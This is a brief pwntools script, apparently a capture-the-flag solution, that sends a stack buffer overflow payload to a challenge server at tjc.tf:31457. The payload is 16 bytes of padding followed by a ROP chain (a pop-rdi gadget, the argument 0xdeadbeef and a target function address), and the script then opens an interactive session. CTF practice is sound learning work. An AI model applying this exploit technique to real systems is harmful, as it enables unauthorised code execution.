from pwn import *
bina='./out'
p=process(bina)
context.binary=bina

r=remote('tjc.tf',31457)

rdi=0x000000000040117a
addr=0x000000000040117f
param=0xdeadbeef

payload=b"A"*16 # offset
payload+=p64(rdi)
payload+=p64(param)
payload+=p64(addr)
print(payload)

r.sendline(payload)
r.interactive()
